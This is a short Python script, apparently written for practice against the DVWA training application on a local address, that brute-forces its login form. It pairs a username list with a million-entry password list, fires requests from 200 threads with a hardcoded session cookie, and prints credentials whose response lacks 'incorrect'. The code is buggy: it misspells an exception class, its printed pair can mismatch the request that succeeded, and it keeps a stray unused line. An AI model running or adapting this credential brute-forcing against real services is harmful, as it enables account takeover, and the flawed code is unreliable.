import requests
from concurrent.futures import ThreadPoolExecutor



cookies = {'PHPSESSID' : 'e8c5334e536a83d5a5946d0cf9f16311', 'security' : 'high'}



nome_utente = []
passwords = []

num_requests = 200

with open('usernames.txt','r') as username :
	nome_utente = username.read().splitlines()
		
with open('1000000-password-seclists.txt','r') as password :
	passwords = password.read().splitlines()
		#print("nome_utente", nome_utente)
		#print("password", passwords)
	
	
			
			
	def send_get_request(url):
				
		try: 
			
			response = requests.get(url, cookies=cookies)
			if ('incorrect' not in response.text):
				print('username=' + n +',&password=' + p)
					
				
		except requests.exceptions.RquestException as e:
			return f'Error: {e}'
			
	with ThreadPoolExecutor(max_workers=num_requests) as executor:
		
		for n in nome_utente:
			for p in passwords:
			
				url = '' 
				url += 'http://192.168.1.64/dvwa/vulnerabilities/brute/?'
				url += 'username=' + n
				url += '&password=' +p
				url += '&Login=Login'
				
				urls = url * num_requests
					
				executor.submit(send_get_request, url)
				
				
			
				
			
			
			
			
			#print(req.status_code)
			
			#print(req.url)
			
		
						